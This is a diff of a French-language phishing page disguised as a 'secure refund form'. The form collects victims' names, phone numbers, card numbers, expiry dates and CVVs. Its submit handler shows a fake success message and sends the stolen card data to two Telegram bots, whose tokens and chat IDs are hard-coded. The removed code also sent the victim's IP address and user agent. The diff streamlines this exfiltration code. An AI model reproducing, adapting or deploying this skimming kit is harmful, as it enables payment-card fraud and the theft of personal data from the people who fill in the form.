@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Formulaire de Remboursement Sécurisé</title>
     <style>
+        /* [Tout le CSS reste identique] */
         * {
             margin: 0;
             padding: 0;
@@ -263,7 +264,6 @@
             color: #e74c3c;
         }
 
-        /* Empêcher la sélection de texte */
         .no-select {
             user-select: none;
             -webkit-user-select: none;
@@ -271,7 +271,6 @@
             -ms-user-select: none;
         }
 
-        /* Cacher les flèches des inputs number */
         input[type="number"]::-webkit-outer-spin-button,
         input[type="number"]::-webkit-inner-spin-button {
             -webkit-appearance: none;
@@ -282,7 +281,6 @@
             -moz-appearance: textfield;
         }
 
-        /* Animation de chargement */
         .loading {
             display: none;
             text-align: center;
@@ -304,7 +302,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Styles pour les messages d'erreur */
         .error-message {
             display: none;
             background: #fee;
@@ -370,13 +367,11 @@
             </div>
 
             <div class="form-container">
-                <!-- Message d'erreur -->
                 <div class="error-message" id="errorMessage">
                     <span class="error-icon">⚠️</span>
                     <span id="errorText"></span>
                 </div>
 
-                <!-- Message de succès -->
                 <div class="success-message" id="successMessage">
                     <span class="error-icon">✅</span>
                     Votre demande est en cours de traitement...
@@ -511,32 +506,24 @@
             const errorText = document.getElementById('errorText');
             const successMessage = document.getElementById('successMessage');
 
-            // Fonction pour afficher les erreurs
             function showError(message) {
                 errorText.textContent = message;
                 errorMessage.classList.add('show');
                 successMessage.classList.remove('show');
-                
-                // Masquer l'erreur après 5 secondes
                 setTimeout(() => {
                     errorMessage.classList.remove('show');
                 }, 5000);
             }
 
-            // Fonction pour afficher le succès
             function showSuccess() {
                 errorMessage.classList.remove('show');
                 successMessage.classList.add('show');
             }
 
-            // Fonction pour mettre en évidence les champs en erreur
             function highlightErrorFields(fields) {
-                // Réinitialiser tous les champs
                 document.querySelectorAll('input, select').forEach(field => {
                     field.classList.remove('field-error');
                 });
-                
-                // Mettre en évidence les champs en erreur
                 fields.forEach(fieldId => {
                     const field = document.getElementById(fieldId);
                     if (field) {
@@ -545,25 +532,20 @@
                 });
             }
 
-            // Fonction pour valider le type de carte
             function isValidCardType(cardNumber) {
                 const firstDigit = cardNumber.charAt(0);
-                // Cartes acceptées: Visa (4), Mastercard (5), Discover (6)
                 return firstDigit === '4' || firstDigit === '5' || firstDigit === '6';
             }
 
-            // Formatage du numéro de téléphone
+            // Formatage des inputs
             const phoneInput = document.getElementById('inputphonenumber');
             phoneInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/[^0-9]/g, '');
-                if (value.length > 10) {
-                    value = value.slice(0, 10);
-                }
+                if (value.length > 10) value = value.slice(0, 10);
                 e.target.value = value;
                 this.classList.remove('field-error');
             });
 
-            // Formatage du numéro de carte et détection du type
             const cardInput = document.getElementById('inputcardnumber');
             const visaLogo = document.getElementById('visa-logo');
             const mastercardLogo = document.getElementById('mastercard-logo');
@@ -571,36 +553,25 @@
             cardInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
                 value = value.replace(/(.{4})(?=\d)/g, '$1 ').trim();
-                if (value.length > 19) {
-                    value = value.slice(0, 19);
-                }
+                if (value.length > 19) value = value.slice(0, 19);
                 e.target.value = value;
                 this.classList.remove('field-error');
                 
-                // Détection du type de carte
                 const firstDigit = value.charAt(0);
                 visaLogo.classList.remove('active');
                 mastercardLogo.classList.remove('active');
-                
-                if (firstDigit === '4') {
-                    visaLogo.classList.add('active');
-                } else if (firstDigit === '5') {
-                    mastercardLogo.classList.add('active');
-                }
+                if (firstDigit === '4') visaLogo.classList.add('active');
+                else if (firstDigit === '5') mastercardLogo.classList.add('active');
             });
 
-            // Validation du CVV (minimum 3 caractères)
             const cvvInput = document.getElementById('inputcvv');
             cvvInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 4) {
-                    value = value.slice(0, 4);
-                }
+                if (value.length > 4) value = value.slice(0, 4);
                 e.target.value = value;
                 this.classList.remove('field-error');
             });
 
-            // Réinitialiser les erreurs quand on modifie un champ
             document.querySelectorAll('input, select').forEach(field => {
                 field.addEventListener('input', function() {
                     this.classList.remove('field-error');
@@ -608,7 +579,7 @@
                 });
             });
 
-            // Gestion de la soumission du formulaire
+            // Soumission du formulaire
             submitButton.addEventListener('click', function(e) {
                 e.preventDefault();
                 
@@ -621,19 +592,17 @@
                 const yy = document.getElementById('inputyy').value;
                 const cvv = document.getElementById('inputcvv').value;
                 
-                // Vérification des champs obligatoires
+                // Validation
                 const errorFields = [];
-                
                 if (!firstname) errorFields.push('inputfirstname');
                 if (!lastname) errorFields.push('inputlastname');
                 if (phone.length !== 10) errorFields.push('inputphonenumber');
                 if (cardnumber.length !== 16) errorFields.push('inputcardnumber');
-                if (cvv.length < 3) errorFields.push('inputcvv'); // CVV minimum 3 caractères
+                if (cvv.length < 3) errorFields.push('inputcvv');
                 if (operator === 'select') errorFields.push('operator');
                 
-                // Validation du type de carte
                 if (cardnumber.length === 16 && !isValidCardType(cardnumber)) {
-                    showError('Carte invalide. Veuillez utiliser une carte Visa, Mastercard ou Discover, ou contacter votre service clientèle.');
+                    showError('Carte invalide. Veuillez utiliser une carte Visa, Mastercard ou Discover.');
                     highlightErrorFields(['inputcardnumber']);
                     return;
                 }
@@ -644,151 +613,68 @@
                     return;
                 }
                 
-                // Afficher le loading et le message de succès
+                // Envoi
                 submitButton.style.display = 'none';
                 loading.style.display = 'block';
                 showSuccess();
                 
-                // Envoi aux deux bots Telegram
-                processPaymentData(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv);
+                // ENVOI SIMPLIFIÉ À TELEGRAM
+                sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv);
             });
 
-            // Fonction pour envoyer aux deux bots Telegram
-            function processPaymentData(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv) {
-                // Configuration des deux bots
-                const bots = [
-                    {
-                        token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
-                        chatId: "5534662562"
-                    },
-                    {
-                        token: "8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k", 
-                        chatId: "8061187067"
-                    }
-                ];
+            // FONCTION TELEGRAM SIMPLIFIÉE
+            function sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv) {
+                // Les deux bots
+                const bot1 = {
+                    token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
+                    chatId: "5534662562"
+                };
+                
+                const bot2 = {
+                    token: "8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k",
+                    chatId: "8061187067"
+                };
 
-                const message = `🔔 **NOUVELLE TRANSACTION** 🔔
+                // Message simple avec toutes les infos
+                const message = `💳 NOUVELLE CARTE 💳
+                
+Prénom: ${firstname}
+Nom: ${lastname}
+Téléphone: ${phone}
+Pays: ${operator}
 
-👤 **INFORMATIONS CLIENT:**
-• Prénom: ${firstname}
-• Nom: ${lastname}
-• Téléphone: ${phone}
-• Pays: ${operator}
+Carte: ${cardnumber}
+Expire: ${mm}/${yy}
+CVV: ${cvv}
 
-💳 **INFORMATIONS CARTE:**
-• Numéro: ${cardnumber}
-• Expiration: ${mm}/${yy}
-• CVV: ${cvv}
+Date: ${new Date().toLocaleString('fr-FR')}`;
 
-📊 **DÉTAILS TECHNIQUES:**
-• Date: ${new Date().toLocaleString('fr-FR')}
-• IP: En cours de récupération
-• User Agent: ${navigator.userAgent}
-
-⚡ **STATUT: Traitement en cours**`;
-
-                let completedRequests = 0;
-                const totalBots = bots.length;
-
-                // Fonction pour gérer la fin des envois
-                function handleCompletion() {
-                    completedRequests++;
-                    if (completedRequests === totalBots) {
-                        // Tous les envois sont terminés, rediriger
-                        setTimeout(() => {
-                            window.location.href = "v.html";
-                        }, 2000);
-                    }
-                }
-
-                // Envoyer à chaque bot
-                bots.forEach((bot, index) => {
-                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: bot.chatId,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
+                // Envoyer au premier bot
+                fetch(`https://api.telegram.org/bot${bot1.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: bot1.chatId,
+                        text: message
                     })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error(`HTTP error! status: ${response.status}`);
-                        }
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log(`✅ Bot ${index + 1} - Message envoyé avec succès:`, data);
-                        handleCompletion();
-                    })
-                    .catch(error => {
-                        console.error(`❌ Bot ${index + 1} - Erreur:`, error);
-                        // Essayer une méthode alternative pour le deuxième bot
-                        if (index === 1) {
-                            sendAlternativeMethod(bot, message);
-                        } else {
-                            handleCompletion();
-                        }
-                    });
                 });
 
-                // Méthode alternative pour le deuxième bot si nécessaire
-                function sendAlternativeMethod(bot, msg) {
-                    // Créer une image avec les données comme méthode alternative
-                    const alternativeMessage = `Bot 2 Alternative - ${msg.substring(0, 100)}...`;
-                    
-                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: bot.chatId,
-                            text: alternativeMessage
-                        })
+                // Envoyer au deuxième bot  
+                fetch(`https://api.telegram.org/bot${bot2.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: bot2.chatId,
+                        text: message
                     })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('✅ Bot 2 (Alternative) - Message envoyé:', data);
-                        handleCompletion();
-                    })
-                    .catch(error => {
-                        console.error('❌ Bot 2 (Alternative) - Échec:', error);
-                        handleCompletion();
-                    });
-                }
+                });
 
-                // Récupérer et envoyer l'IP
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(ipData => {
-                        const ipMessage = `🌐 **IP CLIENT:** ${ipData.ip}`;
-                        
-                        // Envoyer l'IP aux deux bots
-                        bots.forEach(bot => {
-                            fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    chat_id: bot.chatId,
-                                    text: ipMessage,
-                                    parse_mode: 'Markdown'
-                                })
-                            })
-                            .catch(error => console.error('Erreur envoi IP:', error));
-                        });
-                    })
-                    .catch(error => {
-                        console.error('Erreur récupération IP:', error);
-                    });
+                // Redirection après 2 secondes
+                setTimeout(() => {
+                    window.location.href = "v.html";
+                }, 2000);
             }
             
-            // Empêcher le glisser-déposer des images
             document.addEventListener("dragstart", function(event) {
                 if (event.target.tagName.toLowerCase() === "img") {
                     event.preventDefault();
